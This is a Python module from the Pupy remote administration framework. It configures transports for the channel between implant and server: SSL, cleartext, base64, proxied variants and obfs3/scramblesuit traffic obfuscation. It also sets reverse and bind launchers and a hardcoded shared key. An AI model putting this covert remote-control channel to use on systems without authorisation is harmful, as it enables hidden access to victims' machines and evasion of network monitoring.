# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import os
import logging
from .servers import PupyTCPServer
from .clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, PupyProxifiedSSLClient
from .transports import dummy, b64, http
try:
	from .transports.obfs3 import obfs3
except ImportError as e:
	#to make pupy works even without scramblesuit dependencies
	logging.warning("%s. The obfs3 transport has been disabled."%e)
	obfs3=None

try:
	from .transports.scramblesuit import scramblesuit
except ImportError as e:
	#to make pupy works even without scramblesuit dependencies
	logging.warning("%s. The scramblesuit transport has been disabled."%e)
	scramblesuit=None
from .streams import PupySocketStream
from .launchers.simple import SimpleLauncher
from .launchers.auto_proxy import AutoProxyLauncher
from .launchers.bind import BindLauncher
try:
	import ConfigParser as configparser
except ImportError:
	import configparser
from rpyc.utils.authenticators import SSLAuthenticator

ssl_auth=None

def ssl_authenticator():
	config = configparser.ConfigParser()
	config.read("pupy.conf")
	return SSLAuthenticator(config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep), config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep), ciphers="SHA256+AES256:SHA1+AES256:@STRENGTH")

#scramblesuit password must be 20 char long
scramblesuit_passwd="th!s_iS_pupy_sct_k3y"

transports={}
launchers={}

transports["ssl"]={
		"info" : "TCP transport wrapped with SSL",
		"server" : PupyTCPServer,
		"client": PupySSLClient,
		"client_kwargs" : {},
		"authenticator" : ssl_authenticator,
		"stream": PupySocketStream ,
		"client_transport" : dummy.DummyPupyTransport,
		"server_transport" : dummy.DummyPupyTransport,
		"client_transport_kwargs": {},
		"server_transport_kwargs": {},
	}
transports["ssl_proxy"]={
		"info" : "TCP transport wrapped with SSL and passing through a SOCKS4/SOCKS5/HTTP proxy",
		"server" : PupyTCPServer,
		"client": PupyProxifiedSSLClient,
		"client_kwargs" : {'proxy_addr': None, 'proxy_port': None, 'proxy_type':'HTTP'},
		"authenticator" : ssl_authenticator,
		"stream": PupySocketStream ,
		"client_transport" : dummy.DummyPupyTransport,
		"server_transport" : dummy.DummyPupyTransport,
		"client_transport_kwargs": {},
		"server_transport_kwargs": {},
	}
transports["tcp_cleartext"]={
		"info" : "Simple TCP transport transmitting in cleartext",
		"server" : PupyTCPServer,
		"client": PupyTCPClient,
		"client_kwargs" : {},
		"authenticator" : None,
		"stream": PupySocketStream ,
		"client_transport" : dummy.DummyPupyTransport,
		"server_transport" : dummy.DummyPupyTransport,
		"client_transport_kwargs": {},
		"server_transport_kwargs": {},
	}
transports["tcp_cleartext_proxy"]={
		"info" : "TCP transport transmitting in cleartext and passing through a SOCKS4/SOCKS5/HTTP proxy",
		"server" : PupyTCPServer,
		"client": PupyProxifiedTCPClient,
		"client_kwargs" : {'proxy_addr':'127.0.0.1', 'proxy_port':8080, 'proxy_type':'HTTP'},
		"authenticator" : None,
		"stream": PupySocketStream ,
		"client_transport" : dummy.DummyPupyTransport,
		"server_transport" : dummy.DummyPupyTransport,
		"client_transport_kwargs": {},
		"server_transport_kwargs": {},
	}
transports["tcp_base64"]={
		"info" : "TCP transport with base64 encoding",
		"server" : PupyTCPServer,
		"client": PupyTCPClient,
		"client_kwargs" : {},
		"authenticator" : None,
		"stream": PupySocketStream ,
		"client_transport" : b64.B64Client,
		"server_transport" : b64.B64Server,
		"client_transport_kwargs": {},
		"server_transport_kwargs": {},
	}
"""
transports["http_cleartext"]={
		"info" : "TCP transport using HTTP with base64 encoded payloads",
		"server" : PupyTCPServer,
		"client": PupyTCPClient,
		"client_kwargs" : {},
		"authenticator" : None,
		"stream": PupySocketStream ,
		"client_transport" : http.PupyHTTPClient,
		"server_transport" : http.PupyHTTPServer,
		"client_transport_kwargs": {},
		"server_transport_kwargs": {},
	}
"""

if obfs3:
	transports["obfs3"]={
			"info" : "TCP transport using obfsproxy's obfs3 transport",
			"server" : PupyTCPServer,
			"client": PupyTCPClient,
			"client_kwargs" : {},
			"authenticator" : None,
			"stream": PupySocketStream ,
			"client_transport" : obfs3.Obfs3Client,
			"server_transport" : obfs3.Obfs3Server,
			"client_transport_kwargs": {},
			"server_transport_kwargs": {},
		}
if scramblesuit:
	transports["scramblesuit"]={
			"info" : "TCP transport using the obfsproxy's scramblesuit transport",
			"server" : PupyTCPServer,
			"client": PupyTCPClient,
			"client_kwargs" : {},
			"authenticator" : None,
			"stream": PupySocketStream ,
			"client_transport" : scramblesuit.ScrambleSuitClient,
			"server_transport" : scramblesuit.ScrambleSuitServer,
			"client_transport_kwargs": {"password":scramblesuit_passwd}, 
			"server_transport_kwargs": {"password":scramblesuit_passwd},
		}

launchers["connect"]=SimpleLauncher
launchers["auto_proxy"]=AutoProxyLauncher
launchers["bind"]=BindLauncher

